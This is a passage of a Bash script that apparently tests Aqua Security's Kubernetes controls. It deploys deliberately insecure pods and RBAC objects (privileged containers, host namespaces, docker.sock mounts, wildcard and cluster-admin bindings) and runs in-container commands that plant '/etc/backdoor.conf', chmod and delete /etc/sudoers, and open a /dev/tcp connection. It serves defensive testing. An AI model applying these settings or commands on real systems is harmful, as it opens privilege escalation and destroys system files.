        2. Ensure that the Assurance Policy blocks non-compliant images
        3. Ensure that the Assurance Policy is applied to this Kubernetes environment"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            print_colored_message yellow "Deploying non-compliant image test container..."
            echo
            kubectl delete deployment aqua-non-compliant-image-test --ignore-not-found
            kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: aqua-non-compliant-image-test
spec:
  replicas: 1
  selector:
    matchLabels:
      app: aqua-non-compliant-image-test
  template:
    metadata:
      labels:
        app: aqua-non-compliant-image-test
    spec:
      containers:
      - name: eicar
        image: jerbi/eicar:latest
        imagePullPolicy: Always
        command:
        - sleep
        args:
        - infinity
EOF
            echo
            print_colored_message yellow "[!] Observe that the deployment or pod creation is blocked because the image is non-compliant."
            echo
            print_colored_message green "[✓] Please login to the Aqua Console's Assurance and Risk Explorer screens to view the non-compliant image details."
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Unregistered Images
test_block_unregistered_images() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Update the Assurance Policy to block unregistered images
        2. Ensure that the Assurance Policy is applied to this Kubernetes environment
        3. Ensure that 'Automatically registering running containers' is disabled in Global Settings
        4. If using Kube-Enforcer, ensure that 'Registering discovered pod images' is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            read -p "Enter an image to deploy for this test [default: $AQUA_PROBE_IMAGE]: " unregistered_image
            if [ -z "$unregistered_image" ]; then
                unregistered_image="$AQUA_PROBE_IMAGE"
            fi

            echo
            print_colored_message yellow "Deploying unregistered image test container with image: $unregistered_image"
            echo
            kubectl delete deployment aqua-unregistered-image-test --ignore-not-found
            kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: aqua-unregistered-image-test
spec:
  replicas: 1
  selector:
    matchLabels:
      app: aqua-unregistered-image-test
  template:
    metadata:
      labels:
        app: aqua-unregistered-image-test
    spec:
      containers:
      - name: unregistered-image
        image: $unregistered_image
        imagePullPolicy: Always
        command:
        - sleep
        args:
        - infinity
EOF
            echo
            print_colored_message yellow "[!] Observe that the deployment or pod creation is blocked because the image is unregistered."
            echo
            print_colored_message green "[✓] Please login to the Aqua Console's Assurance and Risk Explorer screens to view the unregistered image details."
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# File Integrity Monitoring
test_file_integrity_monitoring() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with File Integrity Monitoring Control enabled
        2. Add '/etc/sudoers' and '/etc/backdoor.conf' to the monitored files
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing File Integrity Monitoring create, modify, permission change, and delete actions in the container..."
                echo
                cat <<'EOF'
# Create a file
echo "malicious change" > /etc/backdoor.conf

# Modify an existing file
echo "debug=true" >> /etc/sudoers

# Change file permissions
chmod 777 /etc/sudoers

# Delete a file
rm /etc/sudoers
EOF
                print_colored_message yellow "Preparing baseline '/etc/sudoers' file..."
                kubectl exec -it $pod_name --container $container_name -- bash -c 'touch /etc/sudoers'

                print_colored_message yellow "Creating '/etc/backdoor.conf'..."
                kubectl exec -it $pod_name --container $container_name -- bash -c 'echo "malicious change" > /etc/backdoor.conf'

                print_colored_message yellow "Modifying '/etc/sudoers'..."
                kubectl exec -it $pod_name --container $container_name -- bash -c 'echo "debug=true" >> /etc/sudoers'

                print_colored_message yellow "Changing permissions on '/etc/sudoers'..."
                kubectl exec -it $pod_name --container $container_name -- chmod 777 /etc/sudoers

                print_colored_message yellow "Deleting '/etc/sudoers'..."
                kubectl exec -it $pod_name --container $container_name -- rm /etc/sudoers
                echo
                print_colored_message yellow "[!] Observe that file create, modify, permission change, or delete activity was detected by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# System Integrity Monitoring
test_system_integrity_monitoring() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with System Integrity Monitoring Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'date +%T -s \"10:00:00\"' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- date +%T -s "10:00:00"
                echo
                print_colored_message yellow "[!] Observe that system time change activity was detected by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Limit Container Privileges
test_limit_container_privileges() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Limit Container Privileges Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that the policy blocks host namespaces, privileged mode, root user, and extra Linux capabilities"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            print_colored_message yellow "Cleaning up previous Limit Container Privileges test pods..."
            kubectl delete pod host-network-test cap-add-test root-user-test privileged-test host-ipc-test host-pid-test host-userns-test host-uts-test --ignore-not-found

            echo
            print_colored_message yellow "1. Access to host network - blocked by hostNetwork: true"
            kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-network-test
spec:
  hostNetwork: true
  containers:
  - name: test
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    command: ["sleep","3600"]
EOF
            echo "Verify: kubectl get pod host-network-test -o yaml | grep hostNetwork"

            echo
            print_colored_message yellow "2. Adding capabilities with --cap-add - blocked by extra Linux capabilities"
            kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: cap-add-test
spec:
  containers:
  - name: test
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      capabilities:
        add:
        - NET_ADMIN
    command: ["sleep","3600"]
EOF
            echo "Common capabilities: SYS_ADMIN, NET_ADMIN, SYS_PTRACE, DAC_OVERRIDE"
            echo "Verify: cat /proc/1/status | grep Cap"

            echo
            print_colored_message yellow "3. Configured with root user - blocked by running as UID 0"
            kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: root-user-test
spec:
  containers:
  - name: test
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      runAsUser: 0
    command: ["sleep","3600"]
EOF
            echo "Verify: id"
            echo "Expected output: uid=0(root) gid=0(root)"

            echo
            print_colored_message yellow "4. Privileged containers - blocked by privileged mode"
            kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: privileged-test
spec:
  containers:
  - name: test
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      privileged: true
    command: ["sleep","3600"]
EOF
            echo "Verify: cat /proc/self/status | grep CapEff"

            echo
            print_colored_message yellow "5. Use the host IPC namespace - blocked by hostIPC: true"
            kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-ipc-test
spec:
  hostIPC: true
  containers:
  - name: test
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    command: ["sleep","3600"]
EOF
            echo "Verify: ipcs"

            echo
            print_colored_message yellow "6. Use the host PID namespace - blocked by hostPID: true"
            kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-pid-test
spec:
  hostPID: true
  containers:
  - name: test
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    command: ["sleep","3600"]
EOF
            echo "Verify: ps aux"

            echo
            print_colored_message yellow "7. Use the host user namespace - blocked by hostUsers: true"
            kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-userns-test
spec:
  hostUsers: true
  containers:
  - name: test
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    command: ["sleep","3600"]
EOF
            echo "Verify: cat /proc/self/uid_map"

            echo
            print_colored_message yellow "8. Use the host UTS namespace - blocked by hostNetwork or sharing UTS namespace"
            kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-uts-test
spec:
  hostNetwork: true
  containers:
  - name: test
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    command: ["sleep","3600"]
EOF
            echo "Verify: hostname"

            echo
            print_colored_message yellow "[!] Observe that the pod deployments are blocked because they request disallowed container privileges."
            echo
            print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Non-Kubernetes Containers
test_block_non_kubernetes_containers() {
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Block Non-Kubernetes Containers Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. SSH to the Kubernetes worker node where the Aqua Enforcer is running
        4. Ensure that you have access to the container runtime to deploy a Docker-only container"
        echo
        print_colored_message yellow "[!] Disclaimer: This test only works when executed on a Kubernetes worker node with direct access to the container runtime. It is intended to deploy a Docker-only container outside the Kubernetes API."
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            print_colored_message yellow "Deploying Docker-only container with image: $AQUA_PROBE_IMAGE"
            echo
            echo "docker run -d --name aqua-non-k8s-container $AQUA_PROBE_IMAGE sleep 3600"
            docker rm -f aqua-non-k8s-container >/dev/null 2>&1
            docker run -d --name aqua-non-k8s-container $AQUA_PROBE_IMAGE sleep 3600
            echo
            print_colored_message yellow "[!] Observe that the Docker-only container is blocked because it was started outside Kubernetes."
            echo
            print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Port Block
test_port_block() {
    local default_host="10.0.0.1"
    local default_port="22"

    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Port Block Control enabled
        2. Add the destination port you will test to the blocked ports list
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"
        echo
        print_colored_message yellow "[!] This test opens a TCP connection from the Aqua test container to a target host and port. Use a reachable target and make sure the same port is configured in the Port Block control."
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                read -p "Enter target host or IP [default: $default_host]: " port_block_host
                if [ -z "$port_block_host" ]; then
                    port_block_host="$default_host"
                fi
                read -p "Enter target port configured in the Port Block policy [default: $default_port]: " port_block_port
                if [ -z "$port_block_port" ]; then
                    port_block_port="$default_port"
                fi

                echo
                print_colored_message yellow "Executing TCP connection test to $port_block_host:$port_block_port in the container..."
                echo
                echo "timeout 5 bash -c 'echo >/dev/tcp/$port_block_host/$port_block_port'"
                kubectl exec -it $pod_name --container $container_name -- bash -c "timeout 5 bash -c 'echo >/dev/tcp/$port_block_host/$port_block_port'"
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because the destination port has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Volumes Blocked
test_volumes_blocked() {
    local default_host_path="/etc"
    local default_mount_path="/host-etc"

    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Volumes Blocked Control enabled
        2. Add the host path you will test to the blocked volumes list
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that the policy is applied to this Kubernetes environment"
        echo
        print_colored_message yellow "[!] This test deploys a pod with a hostPath volume. Use a host path that is configured in the Volumes Blocked control."
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            read -p "Enter blocked host path to mount [default: $default_host_path]: " blocked_host_path
            if [ -z "$blocked_host_path" ]; then
                blocked_host_path="$default_host_path"
            fi
            read -p "Enter container mount path [default: $default_mount_path]: " blocked_mount_path
            if [ -z "$blocked_mount_path" ]; then
                blocked_mount_path="$default_mount_path"
            fi

            echo
            print_colored_message yellow "Deploying volume block test pod with hostPath '$blocked_host_path' mounted at '$blocked_mount_path'..."
            echo
            kubectl delete pod volume-block-test --ignore-not-found
            kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: volume-block-test
spec:
  containers:
  - name: test
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    command: ["sleep","3600"]
    volumeMounts:
    - name: blocked-volume
      mountPath: $blocked_mount_path
      readOnly: true
  volumes:
  - name: blocked-volume
    hostPath:
      path: $blocked_host_path
      type: Directory
EOF
            echo
            echo "Verify: kubectl get pod volume-block-test -o yaml | grep -A5 hostPath"
            echo
            print_colored_message yellow "[!] Observe that the pod creation is blocked because it requests a blocked hostPath volume."
            echo
            print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Non-compliant Resources
test_block_non_compliant_resources() {
    local lab_namespace="aqua-controls-lab"

    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Block Non-compliant Resources enabled
        2. Enable the Kubernetes resource checks you want to validate
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that the policy is applied to this Kubernetes environment"
        echo
        print_colored_message yellow "[!] This test applies intentionally non-compliant Kubernetes resources in namespace '$lab_namespace'. Use only in a disposable lab cluster."
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            print_colored_message yellow "Applying non-compliant Kubernetes resource examples with image: $AQUA_PROBE_IMAGE"
            echo
            kubectl create namespace $lab_namespace --dry-run=client -o yaml | kubectl apply -f -
            apply_non_compliant_resource "host-ipc-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-ipc-bad
  namespace: $lab_namespace
spec:
  hostIPC: true
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "host-pid-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-pid-bad
  namespace: $lab_namespace
spec:
  hostPID: true
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "host-network-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-network-bad
  namespace: $lab_namespace
spec:
  hostNetwork: true
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
EOF
            kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-port-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    ports:
    - containerPort: 80
      hostPort: 8080
---
apiVersion: v1
kind: Pod
metadata:
  name: non-compliant-image-domain-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: anonymous-view-bad
subjects:
- kind: User
  name: system:anonymous
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: view
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: cpu-limit-missing-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    resources:
      requests:
        cpu: "100m"
---
apiVersion: v1
kind: Pod
metadata:
  name: cpu-request-missing-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    resources:
      limits:
        cpu: "500m"
---
apiVersion: v1
kind: Pod
metadata:
  name: allow-privilege-escalation-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      allowPrivilegeEscalation: true
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: configmap-secret-bad
  namespace: $lab_namespace
data:
  password: "SuperSecret123"
  api_key: "abc123"
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: configmap-sensitive-bad
  namespace: $lab_namespace
data:
  username: "admin"
  email: "admin@example.com"
---
apiVersion: v1
kind: Pod
metadata:
  name: caps-not-drop-all-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      capabilities:
        drop:
        - NET_RAW
---
apiVersion: v1
kind: Pod
metadata:
  name: caps-drop-none-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: delete-pod-logs-bad
  namespace: $lab_namespace
rules:
- apiGroups: [""]
  resources: ["pods/log"]
  verbs: ["delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-exec-bad
  namespace: $lab_namespace
rules:
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: ["create"]
---
apiVersion: v1
kind: Pod
metadata:
  name: latest-tag-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
---
apiVersion: v1
kind: Pod
metadata:
  name: disallowed-hostpath-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    volumeMounts:
    - name: host-etc
      mountPath: /host-etc
  volumes:
  - name: host-etc
    hostPath:
      path: /etc
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: rbac-manager-bad
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: networking-manager-bad
rules:
- apiGroups: ["networking.k8s.io"]
  resources: ["networkpolicies", "ingresses"]
  verbs: ["*"]
- apiGroups: [""]
  resources: ["services", "endpoints"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: workload-manager-bad
  namespace: $lab_namespace
rules:
- apiGroups: ["", "apps", "batch"]
  resources: ["pods", "deployments", "daemonsets", "statefulsets", "jobs", "cronjobs"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: manage-all-resources-bad
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: namespace-admin-bad
  namespace: $lab_namespace
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: namespace-secret-manager-bad
  namespace: $lab_namespace
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: cluster-secret-manager-bad
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: webhookconfig-manager-bad
rules:
- apiGroups: ["admissionregistration.k8s.io"]
  resources: ["mutatingwebhookconfigurations", "validatingwebhookconfigurations"]
  verbs: ["*"]
---
apiVersion: v1
kind: Pod
metadata:
  name: hostaliases-bad
  namespace: $lab_namespace
spec:
  hostAliases:
  - ip: "1.2.3.4"
    hostnames:
    - "internal.service.local"
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
---
apiVersion: v1
kind: Pod
metadata:
  name: memory-limit-missing-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    resources:
      requests:
        memory: "128Mi"
---
apiVersion: v1
kind: Pod
metadata:
  name: memory-request-missing-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    resources:
      limits:
        memory: "512Mi"
---
apiVersion: v1
kind: Pod
metadata:
  name: net-raw-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      capabilities:
        add:
        - NET_RAW
---
apiVersion: v1
kind: Pod
metadata:
  name: proc-mount-unmasked-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      procMount: Unmasked
---
apiVersion: v1
kind: Pod
metadata:
  name: privileged-port-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    ports:
    - containerPort: 80
---
apiVersion: v1
kind: Pod
metadata:
  name: privileged-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      privileged: true
---
apiVersion: v1
kind: Pod
metadata:
  name: writable-rootfs-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      readOnlyRootFilesystem: false
---
apiVersion: v1
kind: Pod
metadata:
  name: runs-as-root-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      runAsUser: 0
---
apiVersion: v1
kind: Pod
metadata:
  name: low-gid-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      runAsGroup: 1000
---
apiVersion: v1
kind: Pod
metadata:
  name: low-uid-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      runAsUser: 1000
---
apiVersion: v1
kind: Pod
metadata:
  name: apparmor-unconfined-bad
  namespace: $lab_namespace
  annotations:
    container.apparmor.security.beta.kubernetes.io/app: unconfined
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
---
apiVersion: v1
kind: Pod
metadata:
  name: seccomp-unconfined-bad
  namespace: $lab_namespace
spec:
  securityContext:
    seccompProfile:
      type: Unconfined
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
---
apiVersion: v1
kind: Pod
metadata:
  name: selinux-custom-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      seLinuxOptions:
        user: "system_u"
        role: "system_r"
        type: "spc_t"
        level: "s0:c123,c456"
---
apiVersion: v1
kind: Pod
metadata:
  name: sys-admin-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      capabilities:
        add:
        - SYS_ADMIN
---
apiVersion: v1
kind: Pod
metadata:
  name: sys-module-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      capabilities:
        add:
        - SYS_MODULE
---
apiVersion: v1
kind: Service
metadata:
  name: external-ip-bad
  namespace: $lab_namespace
spec:
  selector:
    app: demo
  externalIPs:
  - 8.8.8.8
  ports:
  - port: 80
    targetPort: 80
---
apiVersion: v1
kind: Pod
metadata:
  name: specific-capability-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    securityContext:
      capabilities:
        add:
        - CHOWN
---
apiVersion: v1
kind: Pod
metadata:
  name: unsafe-sysctl-bad
  namespace: $lab_namespace
spec:
  securityContext:
    sysctls:
    - name: kernel.shm_rmid_forced
      value: "0"
    - name: net.ipv4.ip_forward
      value: "1"
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: user-admin-access-bad
subjects:
- kind: User
  name: developer@example.com
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: default-namespace-bad
  namespace: default
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
---
apiVersion: v1
kind: Pod
metadata:
  name: docker-sock-hostpath-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
      type: Socket
---
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-volume-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $AQUA_PROBE_IMAGE
    imagePullPolicy: Always
    volumeMounts:
    - name: host-var-log
      mountPath: /host-var-log
  volumes:
  - name: host-var-log
    hostPath:
      path: /var/log
EOF
            echo
            print_colored_message yellow "[!] Observe that non-compliant resource creation is blocked or reported by Aqua."
            echo
            print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
            echo
            print_colored_message yellow "Cleanup runs automatically when you select the Terminate Program option."
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
